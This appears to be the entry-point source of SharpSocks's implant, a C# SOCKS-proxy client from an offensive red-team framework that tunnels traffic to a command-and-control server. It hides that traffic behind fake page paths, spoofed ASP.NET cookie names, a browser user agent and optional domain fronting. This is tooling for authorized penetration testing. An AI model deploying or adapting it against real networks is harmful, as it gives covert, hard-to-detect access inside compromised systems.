using System;
using System.Collections.Generic;
using System.Net;
using System.Security;
using System.Threading;
using NDesk.Options;
using SharpSocksImplant.Integration;
using SharpSocksImplant.Logging;
using SharpSocksImplant.Socks;
using SharpSocksImplant.Utils;

namespace SharpSocksImplant
{
    public static class Program
    {
        private static SocksController _sock;
        private static readonly IImplantLog COMMS = new LogToConsole();

        private static void Main(string[] args)
        {
            try
            {
                StartSocks(args);
            }
            catch (Exception e)
            {
                COMMS.LogError(e.Message);
                COMMS.LogError(e.StackTrace);
            }
        }

        private static void StartSocks(string[] args)
        {
            var help = false;
            var verbose = false;
            string serverUriString = null;
            string url1 = null;
            string url2 = null;
            string commandChannelId = null;
            string domain = null;
            string username = null;
            string password = null;
            string proxyUrlString = null;
            string payloadCookieName = null;
            string sessionCookieName = null;
            string userAgent = null;
            string hostHeader = null;
            string key = null;
            short beaconTime = 5000;
            ushort timeBetweenReads = 500;
            var useProxy = false;
            var standaloneMode = false;
            var errors = new List<string>();
            var warnings = new List<string>();
            var optionSet = new OptionSet
            {
                {
                    "use-proxy",
                    "Use proxy server (for system proxy set this and leave -m blank)",
                    v => useProxy = v != null
                },
                {
                    "m=|proxy=",
                    "Proxy Url in format http://<server>:<port> (use-proxy is implied)",
                    v => proxyUrlString = v
                },
                {
                    "u=|username=",
                    "Web proxy username ",
                    v => username = v
                },
                {
                    "d=|domain=",
                    "Web proxy domain ",
                    v => domain = v
                },
                {
                    "p=|password=",
                    "Web proxy password ",
                    v => password = v
                },
                {
                    "k=|encryption-key=",
                    "The encryption key, leave blank to be asked",
                    v => key = v
                },
                {
                    "c=|cmd-id=",
                    "Command Channel Id (required) ",
                    v => commandChannelId = v
                },
                {
                    "b=|beacon=",
                    "Beacon time in (ms)",
                    v => beaconTime = short.Parse(v)
                },
                {
                    "s=|server-uri=",
                    "Uri of the server, default is http://127.0.0.1:8081",
                    v => serverUriString = v
                },
                {
                    "url1=",
                    "pages/2019/stats.php",
                    v => url1 = v
                },
                {
                    "url2=",
                    "web/v10/2/admin.asp",
                    v => url2 = v
                },
                {
                    "session-cookie=",
                    "The name of the cookie to pass the session identifier",
                    v => sessionCookieName = v
                },
                {
                    "payload-cookie=",
                    "The name of the cookie to pass smaller requests through",
                    v => payloadCookieName = v
                },
                {
                    "user-agent=",
                    "The User Agent to be sent in any web request",
                    v => userAgent = v
                },
                {
                    "df=",
                    "The actual Host header to be sent if using domain fronting",
                    v => hostHeader = v
                },
                {
                    "h|?|help",
                    v => help = v != null
                },
                {
                    "v|verbose",
                    v => verbose = v != null
                },
                {
                    "r=|read-time=",
                    "The time between SOCKS proxy reads, default 500ms",
                    v => timeBetweenReads = ushort.Parse(v)
                },
                {
                    "a|standalone",
                    "Standalone mode, do not return on the main thread",
                    v => standaloneMode = v != null
                }
            };
            optionSet.Parse(args);
            const string defaultChannel = "7f404221-9f30-470b-b05d-e1a922be3ff6";
            if (string.IsNullOrWhiteSpace(commandChannelId))
            {
                warnings.Add($"Command Channel Id is blank defaulting to {defaultChannel}");
                if (string.IsNullOrWhiteSpace(commandChannelId))
                    commandChannelId = defaultChannel;
            }

            if (string.IsNullOrWhiteSpace(serverUriString))
            {
                warnings.Add("Server's URI is blank defaulting to http://127.0.0.1:8081");
                if (string.IsNullOrWhiteSpace(serverUriString))
                    serverUriString = "http://127.0.0.1:8081";
            }

            if (!Uri.TryCreate(serverUriString, UriKind.Absolute, out var serverUri))
                errors.Add($"Server URI {serverUriString} is not valid");

            IWebProxy webProxy = null;
            if (useProxy && string.IsNullOrWhiteSpace(proxyUrlString))
            {
                webProxy = WebRequest.GetSystemWebProxy();
            }

            if (!string.IsNullOrWhiteSpace(proxyUrlString))
            {
                if (!Uri.TryCreate(proxyUrlString, UriKind.Absolute, out var proxyUrl))
                {
                    errors.Add($"Proxy URI {proxyUrl} is not valid");
                }
                else
                {
                    if (!string.IsNullOrWhiteSpace(username))
                    {
                        SecureString securePassword;
                        if (string.IsNullOrWhiteSpace(password))
                        {
                            Console.WriteLine("Please enter your proxy password: ");
                            securePassword = ConsolePassword.ReadPasswordFromConsole();
                        }
                        else
                        {
                            securePassword = new SecureString();
                            foreach (var c in password.ToCharArray())
                                securePassword.AppendChar(c);
                        }

                        var credentials = string.IsNullOrWhiteSpace(domain)
                            ? new NetworkCredential(username, securePassword)
                            : (ICredentials)new NetworkCredential(username, securePassword, domain);
                        webProxy = new WebProxy(proxyUrl, false, new List<string>().ToArray(), credentials);
                    }
                    else
                    {
                        webProxy = new WebProxy(proxyUrl, false, new List<string>().ToArray());
                    }

                    useProxy = true;
                }
            }

            Banner();
            if (verbose)
            {
                COMMS.SetVerboseOn();
                COMMS.LogMessage("Verbose mode on");
            }

            COMMS.LogMessage($"Using time between SOCKS reads: {timeBetweenReads}ms");

            if (help)
            {
                optionSet.WriteOptionDescriptions(Console.Out);
            }
            else if (errors.Count > 0)
            {
                errors.ForEach(x => COMMS.LogError(x));
                optionSet.WriteOptionDescriptions(Console.Out);
                return;
            }

            if (warnings.Count > 0)
            {
                warnings.ForEach(x => COMMS.LogMessage(x));
            }

            userAgent ??= "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36";
            sessionCookieName ??= "ASP.NET_SessionId";
            payloadCookieName ??= "__RequestVerificationToken";
            var urlPaths = new List<string>
            {
                url1,
                url2
            };
            _sock = PoshCreateProxy.CreateSocksController(serverUri, commandChannelId, hostHeader, userAgent, key, urlPaths, sessionCookieName, payloadCookieName,
                timeBetweenReads, webProxy, beaconTime, COMMS);
            _sock.Start();
            if (standaloneMode)
            {
                Console.WriteLine("[x] to quit\r\n");
                while ("x" != Console.ReadLine()) Thread.Sleep(5000);
            }
        }

        // ReSharper disable once UnusedMember.Global
        public static void StopSocks()
        {
            _sock.Stop();
            Console.WriteLine("Stopping SharpSocks.......");
        }

        private static void Banner()
        {
            COMMS.BannerMessage("\r\nSharpSocks Proxy Client\r\n=======================\r\n");
        }
    }
}